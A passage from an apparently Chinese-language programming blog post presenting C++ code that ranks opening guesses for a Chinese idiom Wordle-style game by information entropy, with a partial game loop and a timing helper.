&lt; MAXSIZE; i++)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">char</span> *patterns = <span class="keyword">new</span> <span class="keyword">char</span>[<span class="number">3</span> * MAXSIZE];</span><br><span class="line">patternsHead[i] = patterns;</span><br><span class="line">&#125; <span class="comment">// =&gt; 彳亍</span></span><br></pre></td></tr></table></figure><p>以及递归深度方面，由于深度只要不为0就算的真的太慢了，所以我也和3b1b一样，计算深度为1的数据时只拿在深度为0时排名靠前的数据去计算，以减少对获取最优开头词的无效计算</p><div class='spoiler collapsed'>    <div class='spoiler-title'>        crack.cpp    </div>    <div class='spoiler-content'>        <figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fstream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;list&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;math.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;cstring&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MAXSIZE 26352</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> TOP 100</span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//========================================================================</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">char</span> *patternsHead[MAXSIZE];</span><br><span class="line"></span><br><span class="line"><span class="comment">//========================================================================</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">PatternRecord</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="keyword">char</span> pattern[<span class="number">3</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="keyword">int</span> count = <span class="number">1</span>;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">EntropyRecord</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="keyword">float</span> E = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">int</span> index;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">cmp</span><span class="params">(EntropyRecord A, EntropyRecord B)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> A.E &gt; B.E;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//========================================================================</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">InitWords</span><span class="params">(<span class="built_in">string</span> *words)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="function">ifstream <span class="title">f_word</span><span class="params">(<span class="string">&quot;idioms.txt&quot;</span>)</span></span>;</span><br><span class="line">    <span class="built_in">string</span> str_word;</span><br><span class="line">    <span class="keyword">int</span> cnt = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span> (f_word &gt;&gt; str_word)</span><br><span class="line">        words[cnt++] = str_word;</span><br><span class="line">    f_word.close();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//========================================================================</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">SamePattern</span><span class="params">(<span class="keyword">char</span> *guessPattern, <span class="keyword">char</span> *answerPattern)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (guessPattern[<span class="number">0</span>] == answerPattern[<span class="number">0</span>] &amp;&amp;</span><br><span class="line">        guessPattern[<span class="number">1</span>] == answerPattern[<span class="number">1</span>] &amp;&amp;</span><br><span class="line">        guessPattern[<span class="number">2</span>] == answerPattern[<span class="number">2</span>])</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//========================================================================</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">GetRecords</span><span class="params">(<span class="keyword">char</span> *patterns, <span class="built_in">list</span>&lt;PatternRecord&gt; &amp;records, <span class="built_in">list</span>&lt;<span class="keyword">int</span>&gt; enabled)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">// 将词按照其 pattern 分类</span></span><br><span class="line">    <span class="built_in">list</span>&lt;PatternRecord&gt;::iterator iterGuessRec;</span><br><span class="line">    <span class="built_in">list</span>&lt;<span class="keyword">int</span>&gt;::iterator iterEn = enabled.begin();</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; MAXSIZE; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (!enabled.empty() &amp;&amp; i != *iterEn)</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        PatternRecord ansRecord;</span><br><span class="line">        <span class="built_in">memcpy</span>(ansRecord.pattern, &amp;patterns[i * <span class="number">3</span>], <span class="number">3</span>);</span><br><span class="line">        <span class="keyword">bool</span> match = <span class="literal">false</span>;</span><br><span class="line">        <span class="keyword">for</span> (iterGuessRec = records.begin(); iterGuessRec != records.end(); iterGuessRec++)</span><br><span class="line">            <span class="keyword">if</span> (SamePattern((*iterGuessRec).pattern, ansRecord.pattern))</span><br><span class="line">            &#123;</span><br><span class="line">                (*iterGuessRec).count++;</span><br><span class="line">                match = <span class="literal">true</span>;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        <span class="keyword">if</span> (!match)</span><br><span class="line">            records.push_back(ansRecord);</span><br><span class="line">        iterEn++;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//========================================================================</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="built_in">list</span>&lt;<span class="keyword">int</span>&gt; <span class="title">UpdateEnabled</span><span class="params">(<span class="keyword">char</span> *patterns, <span class="keyword">char</span> *pattern, <span class="built_in">list</span>&lt;<span class="keyword">int</span>&gt; lastEnabled)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">// 更新词库</span></span><br><span class="line">    <span class="built_in">list</span>&lt;<span class="keyword">int</span>&gt; enabled;</span><br><span class="line">    <span class="built_in">list</span>&lt;<span class="keyword">int</span>&gt;::iterator lastPtr;</span><br><span class="line">    <span class="keyword">for</span> (lastPtr = lastEnabled.begin(); lastPtr != lastEnabled.end(); lastPtr++)</span><br><span class="line">        <span class="keyword">if</span> (SamePattern(&amp;patterns[(*lastPtr) * <span class="number">3</span>], pattern))</span><br><span class="line">            enabled.push_back(*lastPtr);</span><br><span class="line">    <span class="keyword">return</span> enabled;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//========================================================================</span></span><br><span class="line"></span><br><span class="line"><span class="function">EntropyRecord <span class="title">GetEntropy</span><span class="params">(<span class="keyword">int</span> depth, <span class="keyword">int</span> guessIndex, <span class="built_in">list</span>&lt;<span class="keyword">int</span>&gt; &amp;enabled)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">list</span>&lt;PatternRecord&gt; patternRecords; <span class="comment">// 记录 pattern 数量以及样式</span></span><br><span class="line">    <span class="built_in">list</span>&lt;<span class="keyword">float</span>&gt; patternERecs;           <span class="comment">// 记录上述每种 pattern 对应的 E</span></span><br><span class="line">    GetRecords(patternsHead[guessIndex], patternRecords, enabled);</span><br><span class="line">    <span class="keyword">if</span> (depth)</span><br><span class="line">        <span class="keyword">for</span> (<span class="built_in">list</span>&lt;PatternRecord&gt;::iterator iterPRec = patternRecords.begin();</span><br><span class="line">             iterPRec != patternRecords.end();</span><br><span class="line">             iterPRec++) <span class="comment">// 遍历表层patterns</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="comment">// 根据表层pattern获取newEnabled</span></span><br><span class="line">            <span class="built_in">list</span>&lt;<span class="keyword">int</span>&gt; newEnabled;</span><br><span class="line">            <span class="keyword">if</span> (enabled.empty())</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; MAXSIZE; i++)</span><br><span class="line">                    <span class="keyword">if</span> (SamePattern(&amp;patternsHead[guessIndex][i * <span class="number">3</span>], (*iterPRec).pattern))</span><br><span class="line">                        newEnabled.push_back(i);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">                <span class="keyword">for</span> (<span class="built_in">list</span>&lt;<span class="keyword">int</span>&gt;::iterator iterEn = enabled.begin();</span><br><span class="line">                     iterEn != enabled.end();</span><br><span class="line">                     iterEn++)</span><br><span class="line">                    <span class="keyword">if</span> (SamePattern(&amp;patternsHead[guessIndex][(*iterEn) * <span class="number">3</span>], (*iterPRec).pattern))</span><br><span class="line">                        newEnabled.push_back(*iterEn);</span><br><span class="line"></span><br><span class="line">            <span class="built_in">list</span>&lt;<span class="keyword">float</span>&gt; localERecords; <span class="comment">// 记录里层 E</span></span><br><span class="line">            <span class="keyword">if</span> (newEnabled.size() &lt; <span class="number">2</span>)</span><br><span class="line">                localERecords.push_back(<span class="number">1</span>);</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">                <span class="keyword">for</span> (<span class="built_in">list</span>&lt;<span class="keyword">int</span>&gt;::iterator newGuessIndex = newEnabled.begin();</span><br><span class="line">                     newGuessIndex != newEnabled.end();</span><br><span class="line">                     newGuessIndex++) <span class="comment">// 遍历里层词库</span></span><br><span class="line">                    <span class="comment">// 递归入口</span></span><br><span class="line">                    localERecords.push_back(GetEntropy(depth - <span class="number">1</span>, *newGuessIndex, newEnabled).E);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">float</span> localMax = <span class="number">0</span>; <span class="comment">// 里层 E 最大值</span></span><br><span class="line">            <span class="keyword">for</span> (<span class="built_in">list</span>&lt;<span class="keyword">float</span>&gt;::iterator iterERec = localERecords.begin();</span><br><span class="line">                 iterERec != localERecords.end();</span><br><span class="line">                 iterERec++)</span><br><span class="line">                <span class="keyword">if</span> (localMax &lt; *iterERec)</span><br><span class="line">                    localMax = *iterERec;</span><br><span class="line">            patternERecs.push_back(localMax);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    EntropyRecord entropyRecord;</span><br><span class="line">    entropyRecord.index = guessIndex;</span><br><span class="line">    <span class="built_in">list</span>&lt;PatternRecord&gt;::iterator iterP = patternRecords.begin();</span><br><span class="line">    <span class="built_in">list</span>&lt;<span class="keyword">float</span>&gt;::iterator iterE = patternERecs.begin();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (; iterP != patternRecords.end(); iterE++, iterP++) <span class="comment">// E(p)</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">float</span> prob = <span class="keyword">float</span>((*iterP).count) / <span class="keyword">float</span>(enabled.empty() ? MAXSIZE : enabled.size());</span><br><span class="line">        entropyRecord.E += -prob * log2(prob);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (depth)</span><br><span class="line">    &#123;</span><br><span class="line">        iterP = patternRecords.begin();</span><br><span class="line">        iterE = patternERecs.begin();</span><br><span class="line">        <span class="keyword">for</span> (; iterE != patternERecs.end(); iterE++, iterP++) <span class="comment">// E(E&#x27;,p) 其中 E&#x27; 为上一层的 E</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">float</span> prob = <span class="keyword">float</span>((*iterP).count) / <span class="keyword">float</span>(enabled.empty() ? MAXSIZE : enabled.size());</span><br><span class="line">            entropyRecord.E += prob * (*iterE);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> entropyRecord;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//========================================================================</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//  &#123; 表层词库 &#125;  -&gt;  &#123; 表层patterns &#125;  -&gt;  &#123; 里层词库 &#125;  -&gt;  &#123; 里层patterns &#125;</span></span><br><span class="line"><span class="comment">//                       E1 = ∑p*E0                            E0 = ∑-p*log2(p)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//========================================================================</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">// Init</span></span><br><span class="line">    <span class="built_in">string</span> words[MAXSIZE];</span><br><span class="line">    InitWords(words);</span><br><span class="line">    <span class="function">ifstream <span class="title">f_in</span><span class="params">(<span class="string">&quot;patterns.dat&quot;</span>, ios::in | ios::binary)</span></span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; MAXSIZE; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">char</span> *patterns = <span class="keyword">new</span> <span class="keyword">char</span>[<span class="number">3</span> * MAXSIZE];</span><br><span class="line">        patternsHead[i] = patterns;</span><br><span class="line">        f_in.read(patterns, MAXSIZE * <span class="number">3</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    f_in.close();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// E calculation with depth=0 for all data</span></span><br><span class="line">    <span class="built_in">list</span>&lt;<span class="keyword">int</span>&gt; enabled; <span class="comment">// 形式 enabled，除了参数占位无实际作用</span></span><br><span class="line">    <span class="built_in">list</span>&lt;EntropyRecord&gt; entropyRecords, topERecs;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> guessIndex = <span class="number">0</span>; guessIndex &lt; MAXSIZE; guessIndex++)</span><br><span class="line">    &#123;</span><br><span class="line">        EntropyRecord myEntRec = GetEntropy(<span class="number">0</span>, guessIndex, enabled);</span><br><span class="line">        <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;&gt;&gt; D0-No.&quot;</span> &lt;&lt; guessIndex &lt;&lt; <span class="string">&quot; &quot;</span> &lt;&lt; words[guessIndex]</span><br><span class="line">             &lt;&lt; <span class="string">&quot; complete with E of &quot;</span> &lt;&lt; myEntRec.E &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">        entropyRecords.push_back(myEntRec);</span><br><span class="line">    &#125;</span><br><span class="line">    entropyRecords.sort(cmp);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Save TOP ranks at depth 0 with E value</span></span><br><span class="line">    <span class="built_in">list</span>&lt;EntropyRecord&gt;::iterator iterERec = entropyRecords.begin();</span><br><span class="line">    ofstream f_word(&quot;d0rankedWord.txt&quot;), f_E(&quot;d0rankedE.txt&quot;);</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> cnt = <span class="number">0</span>; iterERec != entropyRecords.end(); iterERec++, cnt++)</span><br><span class="line">    &#123;</span><br><span class="line">        f_word &lt;&lt; words[(*iterERec).index] &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">        f_E &lt;&lt; (*iterERec).E &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    f_word.close();</span><br><span class="line">    f_E.close();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// E calculation with depth=1 for TOP</span></span><br><span class="line">    iterERec = entropyRecords.begin();</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> cnt = <span class="number">0</span>; cnt &lt; TOP; iterERec++, cnt++)</span><br><span class="line">    &#123;</span><br><span class="line">        EntropyRecord myEntRec = GetEntropy(<span class="number">1</span>, (*iterERec).index, enabled);</span><br><span class="line">        <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;&gt;&gt; D1-No.&quot;</span> &lt;&lt; cnt &lt;&lt; <span class="string">&quot; &quot;</span> &lt;&lt; words[(*iterERec).index]</span><br><span class="line">             &lt;&lt; <span class="string">&quot; complete with E of &quot;</span> &lt;&lt; myEntRec.E &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">        topERecs.push_back(myEntRec);</span><br><span class="line">    &#125;</span><br><span class="line">    topERecs.sort(cmp);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Save TOP ranks at depth 1 with E value</span></span><br><span class="line">    f_word.open(<span class="string">&quot;d1rankedWord.txt&quot;</span>);</span><br><span class="line">    f_E.open(<span class="string">&quot;d1rankedE.txt&quot;</span>);</span><br><span class="line">    <span class="keyword">for</span> (iterERec = topERecs.begin(); iterERec != topERecs.end(); iterERec++)</span><br><span class="line">    &#123;</span><br><span class="line">        f_word &lt;&lt; words[(*iterERec).index] &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">        f_E &lt;&lt; (*iterERec).E &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    f_word.close();</span><br><span class="line">    f_E.close();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>    </div></div><h3 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h3><p>其实我是准备吧handle完整搬到c++上来的，结果代码弄完了发现我不知道怎么让c++支持中文输入（？</p><p>但是不准备继续日了，放个之前的代码</p><div class='spoiler collapsed'>    <div class='spoiler-title'>        crackGen.cpp    </div>    <div class='spoiler-content'>        <figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">GetRand</span><span class="params">(<span class="keyword">int</span> seed=<span class="number">0</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    srand(seed ? seed : (<span class="keyword">int</span>)time(<span class="literal">NULL</span>));</span><br><span class="line">    <span class="keyword">return</span> rand() % MAXSIZE;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">ShowMatch</span><span class="params">(<span class="keyword">char</span> *partern, ZHword guess)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">4</span>; i++, <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot; &quot;</span>)</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; <span class="number">3</span>; j++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">int</span> index = j + <span class="number">3</span> * i;</span><br><span class="line">            <span class="keyword">if</span> ((<span class="keyword">int</span>)partern[index] == <span class="number">2</span>)</span><br><span class="line">                <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;[&quot;</span> &lt;&lt; guess.pinyin[index] &lt;&lt; <span class="string">&quot;]&quot;</span>;</span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">if</span> ((<span class="keyword">int</span>)partern[index] == <span class="number">1</span>)</span><br><span class="line">                <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;&lt;&quot;</span> &lt;&lt; guess.pinyin[index] &lt;&lt; <span class="string">&quot;&gt;&quot;</span>;</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">                <span class="built_in">cout</span> &lt;&lt; guess.pinyin[index];</span><br><span class="line">        &#125;</span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">StartRound</span><span class="params">(<span class="keyword">int</span> roundLimit, <span class="built_in">list</span>&lt;ZHword&gt; words)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">list</span>&lt;ZHword&gt;::iterator answer = words.begin();</span><br><span class="line">    advance(answer, GetRand() - <span class="number">1</span>);</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> round = <span class="number">0</span>; round &lt; roundLimit; round++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">list</span>&lt;ZHword&gt;::iterator guess;</span><br><span class="line">        <span class="built_in">string</span> guessIn;</span><br><span class="line">        <span class="keyword">char</span> results[<span class="number">12</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">        <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;&gt;&gt; Round: &quot;</span> &lt;&lt; round &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// ====================================================== //</span></span><br><span class="line">        <span class="built_in">cin</span> &gt;&gt; guessIn; <span class="comment">// TNND C++不能输入中文 QAQ</span></span><br><span class="line"><span class="comment">// ====================================================== //</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (guess = words.begin(); guess != words.end(); guess++)</span><br><span class="line">            <span class="keyword">if</span> ((*guess).word == guessIn)</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">if</span> ((*guess).word != guessIn)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;&gt;&gt; Unkown word&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (CheckPart(*guess, *answer, results))</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;&gt;&gt; Correct&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        ShowMatch(results, *guess);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;&gt;&gt; Failed&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>    </div></div><p>还有就是这令人发指的运行速度，不会多核多线程优化所以没办法，但是可以加入计时函数量化我的痛苦 :)</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;time.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">double</span> <span class="title">CheckTime</span><span class="params">(<span class="keyword">clock_t</span> &amp;start, <span class="keyword">clock_t</span> end)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">double</span> delta = <span class="keyword">double</span>(end - start) / CLOCKS_PER_SEC;</span><br><span class="line">    start = end;</span><br><span class="line">    <span class="keyword">return</span> delta;</span><br><span class="line">&#125;</span><br><span 